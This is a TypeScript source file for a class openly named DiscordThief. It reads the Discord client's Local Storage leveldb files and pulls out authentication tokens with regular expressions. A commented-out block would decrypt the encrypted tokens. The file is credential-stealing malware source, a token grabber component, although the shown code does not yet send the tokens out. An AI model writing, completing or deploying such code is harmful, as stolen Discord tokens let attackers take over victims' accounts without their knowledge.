import fsPromises from 'fs/promises'
import path from 'path'

import { getDiscordPath } from './utils'
import { ENCRYPTED_REGEX, UNENCRYPTED_REGEX } from './const'

export class DiscordThief {
    public readonly discordPath = getDiscordPath()

    public async getTokens() {
        // const encryptionKey = await this.getEncryptionKey()

        const tokens: string[] = []
        const encryptedTokens: string[] = []

        const dbPath = path.join(this.discordPath, 'Local Storage/leveldb')
        const dbFileNames = await fsPromises.readdir(dbPath)

        for (const fileName of dbFileNames) {
            let data: string

            try {
                data = await fsPromises.readFile(
                    path.join(dbPath, fileName),
                    'utf-8'
                )
            } catch {
                continue
            }

            for (const regex of UNENCRYPTED_REGEX) {
                const matches = data.match(regex)

                if (!matches) {
                    continue
                }

                tokens.push(matches[0])
            }

            for (const regex of ENCRYPTED_REGEX) {
                const matches = data.match(regex)

                if (!matches) {
                    continue
                }

                encryptedTokens.push(matches[0])
            }

            // for (const encryptedToken of encryptedTokens) {
            //     const token = await this.decryptToken(
            //         b64Decode(encryptedToken.split('dQw4w9WgXcQ:')[1]),
            //         encryptionKey
            //     )

            //     if (!token) {
            //         continue
            //     }

            //     tokens.push(token)
            // }
        }

        return tokens
    }
}
